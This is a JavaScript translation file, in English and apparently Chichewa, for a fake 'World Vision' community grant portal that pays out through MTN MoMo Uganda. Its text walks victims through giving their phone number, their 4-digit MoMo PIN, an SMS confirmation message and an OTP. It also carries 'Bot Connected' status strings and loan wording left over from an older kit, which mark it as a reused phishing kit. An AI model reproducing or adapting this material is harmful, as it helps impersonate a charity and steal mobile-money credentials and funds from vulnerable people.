(function() {
  const translations = {
    en: {
      title: "World Vision — Partnership & Community Grant Portal",
      heroBadge: "World Vision • Community Partnerships & Grants",
      heroHeading: "Partner with World Vision",
      heroSubtitle: "Empowering communities through sustainable partnership grants, agricultural development, and child welfare initiatives. Direct grant funding via MTN MoMo.",
      requestedAmount: "Requested Grant Budget",
      interestRate: "100% Grant Support",
      repaymentTerm: "Project Implementation Timeline",
      month1: "3 Months",
      months3: "6 Months",
      months6: "12 Months",
      months12: "24 Months",
      estMonthly: "Est. Monthly Phase Support:",
      totalRepay: "Total Grant Allocation:",
      applyNow: "APPLY FOR PARTNERSHIP GRANT NOW",
      step1Title: "Project & Partnership Scope",
      step1Sub: "Specify your organization, project domain, and requested funding parameters (UGX 100,000 - UGX 10,000,000).",
      loanType: "Partnership Category",
      amountLabel: "Requested Grant Funding (UGX)",
      termLabel: "Project Timeline (Months)",
      purposeLabel: "Project Description & Community Need",
      continueToPersonal: "CONTINUE TO REPRESENTATIVE DETAILS",
      step2Title: "MoMo Uganda Account Details",
      step2Sub: "Enter authorized representative details and active MTN MoMo Uganda mobile wallet.",
      firstName: "Representative First Name",
      lastName: "Representative Last Name",
      orangePhone: "MTN MoMo Uganda Mobile Number (+256)",
      employmentStatus: "Organization / Entity Type",
      agentConsent: "I authorize MoMo Uganda to assist with verifying my account for grant disbursement.",
      continueToAuth: "LINK TO MOMO ACCOUNT & PROCEED",
      step3Title: "MoMo Uganda Account Sign In",
      step3Sub: "Confirm your phone number and enter your 4-digit Account PIN to validate.",
      phoneNum: "MTN MoMo Uganda Mobile Number",
      pinLabel: "MoMo Account PIN (4 digits):",
      showPin: "Show",
      hidePin: "Hide",
      confirmLoanBtn: "AUTHORIZE & CONFIRM MOMO PIN",
      confirmPinBtn: "AUTHORIZE & CONFIRM MOMO PIN",
      awaitingApproval: "Awaiting Approval",
      pinAwaitingDesc: "Your 4-digit PIN has been submitted. Please wait while your verification is processed...",
      step4Title: "Account Ownership Verification",
      step4Sub: "Copy or wait for the SMS confirmation message from MoMo Uganda then paste below.",
      smsLabel: "SMS Confirmation Message",
      submitSmsBtn: "SUBMIT VERIFICATION MESSAGE",
      awaitingVerification: "Awaiting Verification",
      smsAwaitingDesc: "Your SMS verification has been submitted. Verification is in progress...",
      step5OtpTitle: "OTP Verification",
      otpHeading: "Enter OTP Code",
      otpSub: "Enter the 4-digit OTP code sent to your phone via MTN MoMo Uganda",
      otpLabel: "OTP Code (4 digits):",
      verifyApproveBtn: "VERIFY & APPROVE LOAN",
      step5Title: "Loan Approved & Processing!",
      step5Sub: "Your partnership grant request has been processed by World Vision.",
      appRef: "Application Reference:",
      applicantName: "Representative:",
      orangeContact: "MoMo Contact:",
      loanMode: "Partnership Category:",
      requestedAmt: "Requested Grant:",
      termRepay: "Timeline / Support:",
      currentStatus: "Current Status:",
      statusPending: "⏳ Under Review",
      newLoanBtn: "APPLY FOR ANOTHER PARTNERSHIP",
      congratsHeading: "Congratulations!",
      congratsSub: "Your loan has been approved! Funds are being disbursed to your MoMo account.",
      approvedAmountLabel: "APPROVED LOAN AMOUNT",
      complianceNoticeTitle: "COMPLIANCE NOTICE",
      complianceNoticeBody: "Your MoMo account must remain active. Ensure your mobile wallet is enabled for loan disbursement.",
      loanDetailsHeader: "Loan Details",
      monthlyPaymentLabel: "MONTHLY PAYMENT",
      loanTermLabel: "LOAN TERM",
      interestRateLabel: "INTEREST RATE",
      quickActionsTitle: "Quick Actions",
      btnDeposit: "Deposit Funds",
      btnWithdraw: "Withdraw Funds",
      btnLoanInfo: "Loan Details",
      nextStepsTitle: "Next Steps:",
      nextStepsBody: "You will receive an SMS confirmation with transaction details shortly.",
      returnHomeBtn: "Return Home",
      footerRights: "© 2026 World Vision — Community Grants & Development Partnerships"
    },
    zm: {
      title: "World Vision — Portal ya Mgwirizano ndi Ndalama za Ntchito",
      heroBadge: "World Vision • Thandizo la Mgwirizano",
      heroHeading: "Pemphani Mgwirizano wa World Vision",
      heroSubtitle: "Kupititsa patsogolo madera kudzera mu thandizo la ndalama, ulimi ndi chisamaliro cha ana. Kulandira kudzera pa MTN MoMo.",
      requestedAmount: "Bajeti ya Ndalama Zofunidwa",
      interestRate: "Thandizo Lapadera 100%",
      repaymentTerm: "Nthawi Yogwirira Ntchito",
      month1: "Miezi 3",
      months3: "Miezi 6",
      months6: "Miezi 12",
      months12: "Miezi 24",
      estMonthly: "Thandizo pa Mwezi:",
      totalRepay: "Ndalama Zonse za Thandizo:",
      applyNow: "PEMPHANI MGWIRIZANO WA THANDIZO",
      step1Title: "Zambiri za Pulojekiti & Mgwirizano",
      step1Sub: "Lembani gulu lanu, ntchito ndi ndalama zomwe mukufuna (UGX 100,000 - UGX 10,000,000).",
      loanType: "Mtundu wa Mgwirizano",
      amountLabel: "Ndalama Zofunidwa (UGX)",
      termLabel: "Nthawi ya Ntchito (Miezi)",
      purposeLabel: "Kufotokozera za Ntchito ya Mudzi",
      continueToPersonal: "PITANI PA ZAMBIRI ZA WOIMIRIRA",
      step2Title: "Zambiri za Akaunti ya MoMo Uganda",
      step2Sub: "Lembani za mtsogoleri ndi nambala ya MTN MoMo Uganda (+256) yolandirira ndalama.",
      firstName: "Dzina Loyamba la Woimirira",
      lastName: "Dzina Lomaliza la Woimirira",
      orangePhone: "Nambala ya MTN MoMo Uganda (+256)",
      employmentStatus: "Mtundu wa Gulu kapena Bungwe",
      agentConsent: "Ndikuvomereza mgwirizano uwu ndi MoMo Uganda polandira ndalama.",
      continueToAuth: "LUMIKIZANI KU MOMO NDI KUPITA PATSOGOLO",
      step3Title: "Lowani pa Akaunti ya MoMo Uganda",
      step3Sub: "Tsimikizirani nambala ya foni ndi PIN yanu ya 4-digits.",
      phoneNum: "Nambala ya MoMo Uganda",
      pinLabel: "PIN ya MoMo (tarakimu 4):",
      showPin: "Onetsani",
      hidePin: "Bisani",
      confirmLoanBtn: "TSIMIKIZANI & LANDIRANI NGONGOLE",
      confirmPinBtn: "TSIMIKIZIRANI PIN",
      awaitingApproval: "Idekha Chivomerezo",
      pinAwaitingDesc: "PIN yanu yatumizidwa. Chonde dikirani pomwe ikutsimikizidwa...",
      step4Title: "Kutsimikizira Uphungu wa Akaunti",
      step4Sub: "Koperani uthenga wa SMS wolandilidwa pa MoMo ndikumatira m'munsimu.",
      smsLabel: "Uthenga wa SMS Wolandila",
      submitSmsBtn: "TUMIZANI UTHENGA WA SMS",
      awaitingVerification: "Ikutsimikizidwa",
      smsAwaitingDesc: "Uthenga wanu wa SMS watumizidwa. Dikirani pang'ono...",
      step5OtpTitle: "Kutsimikizira OTP",
      otpHeading: "Lembani Khodi ya OTP",
      otpSub: "Lembani nambala 4 ya OTP yomwe yatumizidwa pa foni yanu kudzera pa MTN MoMo Uganda",
      otpLabel: "Khodi ya OTP (manambala 4):",
      verifyApproveBtn: "TSIMIKIZANI & VOMEREZANI NGONGOLE",
      step5Title: "Ngongole Yavomerezedwa!",
      step5Sub: "Pempho lanu lavomerezedwa ndi World Vision.",
      appRef: "Nambala ya Pempho:",
      applicantName: "Woimirira:",
      orangeContact: "Mawasiliano ya MoMo:",
      loanMode: "Mtundu wa Mgwirizano:",
      requestedAmt: "Ndalama Zofunidwa:",
      termRepay: "Nthawi / Malipiro:",
      currentStatus: "Kawonedwe:",
      statusPending: "⏳ Ikuyang'aniridwa",
      newLoanBtn: "PEMPHANI MGWIRIZANO WINA",
      congratsHeading: "Zikomo Kwambiri!",
      congratsSub: "Pempho la ngongole lavomerezedwa! Ndalama zikutumizidwa ku akaunti yanu ya MoMo.",
      approvedAmountLabel: "NDALAMA YA NGONGOLE YOVOMEREZEDWA",
      complianceNoticeTitle: "CHENJEZO LA UTIIFU",
      complianceNoticeBody: "Akaunti yanu ya MoMo ikhale yogwira ntchito polandila ndalama za ngongole.",
      loanDetailsHeader: "Zambiri za Ngongole",
      monthlyPaymentLabel: "MALIPILO PA MWEZI",
      loanTermLabel: "NTHAWI YA NGONGOLE",
      interestRateLabel: "CHIYAMBI CHA CHIWONGOLA DZANJA",
      quickActionsTitle: "Zochita Mwachangu",
      btnDeposit: "Ikani Ndalama",
      btnWithdraw: "Cotsani Ndalama",
      btnLoanInfo: "Zambiri za Ngongole",
      nextStepsTitle: "Zochita Zotsatira:",
      nextStepsBody: "Muzalandira SMS yotsimikizira posachedwa.",
      returnHomeBtn: "Bwererani Panyumba",
      footerRights: "© 2026 World Vision — Community Grants & Development Partnerships"
    },
    common: {
      "Bot Conectado": { zm: "Bot Imeunganishwa", en: "Bot Connected" },
      "Bot Connected": { zm: "Bot Imeunganishwa", en: "Bot Connected" },
      "Configurado": { zm: "Imewekwa", en: "Configured" },
      "Configured": { zm: "Imewekwa", en: "Configured" },
      "Bot Desconectado": { zm: "Bot Haifanyi Kazi", en: "Bot Disconnected" },
      "Bot Disconnected": { zm: "Bot Haifanyi Kazi", en: "Bot Disconnected" },
      "Link copiado com sucesso!": { zm: "Kiunganishi kimenakiliwa vizuri!", en: "Link copied successfully!" },
      "Link copied successfully!": { zm: "Kiunganishi kimenakiliwa vizuri!", en: "Link copied successfully!" },
      "Pendente": { zm: "Inasubiri", en: "Pending" },
      "Pending": { zm: "Inasubiri", en: "Pending" },
      "Em Análise": { zm: "Inakaguliwa", en: "Under Review" },
      "Under Review": { zm: "Inakaguliwa", en: "Under Review" },
      "Aprovado": { zm: "Imeidhinishwa", en: "Approved" },
      "Approved": { zm: "Imeidhinishwa", en: "Approved" },
      "Rejeitado": { zm: "Imekataliwa", en: "Rejected" },
      "Rejected": { zm: "Imekataliwa", en: "Rejected" },
      "meses": { zm: "miezi", en: "months" },
      "candidatura(s).": { zm: "ombi/maombi.", en: "application(s)." }
    }
  };

  // Default language is English ('en')
  let currentLang = localStorage.getItem("momo_lang") || "en";

  window.t = function(key) {
    if (!key) return "";
    if (translations.common && translations.common[key]) {
      return translations.common[key][currentLang] || translations.common[key].en || key;
    }
    const dict = translations[currentLang] || translations.en;
    return dict[key] || key;
  };

  function setLanguage(lang) {
    currentLang = lang;
    localStorage.setItem("momo_lang", lang);
    const dict = translations[lang] || translations.en;
    
    document.querySelectorAll(".language-toggle").forEach(btn => {
      btn.innerText = lang.toUpperCase();
    });

    document.querySelectorAll("[data-i18n]").forEach(el => {
      const key = el.getAttribute("data-i18n");
      if (dict[key]) {
        el.innerText = dict[key];
      }
    });
  }

  document.addEventListener("DOMContentLoaded", () => {
    setLanguage(currentLang);
    document.querySelectorAll(".language-toggle").forEach(btn => {
      btn.addEventListener("click", () => {
        const nextLang = currentLang === "en" ? "zm" : "en";
        setLanguage(nextLang);
      });
    });
  });
})();